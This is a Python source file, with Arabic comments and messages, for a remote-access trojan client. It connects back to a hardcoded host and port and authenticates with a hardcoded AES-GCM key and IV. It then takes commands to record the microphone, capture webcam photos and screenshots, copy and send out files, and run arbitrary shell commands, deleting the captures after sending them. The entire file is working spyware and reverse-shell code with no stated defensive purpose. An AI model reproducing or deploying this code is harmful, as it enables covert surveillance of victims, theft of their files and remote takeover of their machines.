from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import socket
import subprocess
import time
import pyautogui
import os
import cv2
import shutil
import sounddevice as sd  
import numpy as np 
import scipy.io.wavfile as wav 

def encrypt_data(key, data, iv):
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    cipherdata = encryptor.update(data) + encryptor.finalize()
    tag = encryptor.tag
    return cipherdata, tag

def decrypt_data(key, cipherdata, iv, tag):
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
    decryptor = cipher.decryptor()
    data = decryptor.update(cipherdata) + decryptor.finalize()
    return data

password = "hacker123/***/---/hack_is_the_best...//**/IIIIEURLREUSERSSLNVBIE"
key = b'\xa9\xc8\xe5\xd2\x19\xa3\xd3=9\xeb\xe7\xc4J!N\x02\x85\xf7h4G\xe4A\x16\xbddU\x94\x0b+a\xb8'
iv = b'^\x86\x9e\x92\xb0\xe8\x96\x9fv/}9'


def recording_micro():
    try:
        duration = 5
        rate = 44100


        recording = sd.rec(int(duration * rate),samplerate = rate , channels = 1 , dtype = 'int16')


        sd.wait()


        wav.write('output.wav',rate,recording)
        return 'output.wav'

        
    except Exception as e:
        print(f"erorr:{e}")

def capture_image():
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        print("خطأ: الكاميرا لم تفتح")
        return None
    ret, frame = cam.read()
    cam.release()
    if ret:
        cv2.imwrite("captured_image.jpg", frame)
        return "captured_image.jpg"
    else:
        print("خطأ: فشل الالتقاط، حاول مرة أخرى")
        return None

def screenshot_():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    return "screenshot.png"

host = "192.168.1.12"
port = 4447

# محاولة الاتصال بالخادم
for i in range(20):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        break
    except Exception as e:
        print(f"خطأ في الاتصال: {e}")
        time.sleep(15)

try:
    password_password = password.encode('utf-8')
    encrypted_dataa , tag = encrypt_data(key,password_password,iv)
    s.sendall(encrypted_dataa + tag)

    

    while True:
        data = b''
        while True:
            part = s.recv(4096)
            data += part
            if len(part) < 4096:
                break
        if len(data)> 16:

            tag = data[-16:]
            data = data[:-16]
            cmd = decrypt_data(key, data, iv, tag).decode('utf-8')

        if cmd == 'exit':
            s.close()
            break
        
        elif cmd == "micro recording":
            micro = recording_micro()
            try:
                with open(micro,'rb') as file:
                    file_data = file.read()
                    encrypted_data , tag = encrypt_data(key,file_data,iv)
                    s.sendall(encrypted_data + tag)
                os.remove(micro)
            except Exception as e :
                print(f"err:{e}")

        elif cmd == "screenshot":
            screen = screenshot_()
            try:
                with open(screen, "rb") as file:
                    file_data = file.read()
                    encrypted_data, tag = encrypt_data(key, file_data, iv)
                    s.sendall(encrypted_data + tag)
                os.remove(screen)
            except Exception as e:
                print(f'خطأ أثناء إرسال لقطة الشاشة: {e}')
                
        elif cmd == "captured":
            camera = capture_image()
            if camera:
                with open(camera, "rb") as file:
                    file_data = file.read()
                    encrypted_data, tag = encrypt_data(key, file_data, iv)
                    s.sendall(encrypted_data + tag)
                os.remove(camera)

        elif cmd.startswith('copy'):
            paths = cmd[5:].strip().split(" ")
            if len(paths) == 2:
                source_path, destination_path = paths
                if os.path.exists(source_path):
                    destination_dir = os.path.dirname(destination_path)
                    if not os.path.exists(destination_dir):
                        os.makedirs(destination_dir)
                    try:
                        shutil.copy(source_path, destination_path)
                        with open(destination_path, 'rb') as file:
                            file_data = file.read()
                            encrypted_data, tag = encrypt_data(key, file_data, iv)
                            s.sendall(encrypted_data + tag)
                        os.remove(destination_path)
                    except Exception as e:
                        s.send(f"خطأ في نسخ الملف: {str(e)}".encode('utf-8'))
                else:
                    s.send(f"الملف المصدر غير موجود: {source_path}".encode('utf-8'))
            else:
               
                  s.send("يرجى تحديد المسار الصحيح للملف المصدر والوجهة.".encode('utf-8'))

        else:
            output = subprocess.getoutput(cmd)
            encrypted_data, tag = encrypt_data(key, output.encode('utf-8'), iv)

            s.sendall(encrypted_data + tag)

except Exception as e:
    print(f"خطأ: {e}")
finally:
    s.close()
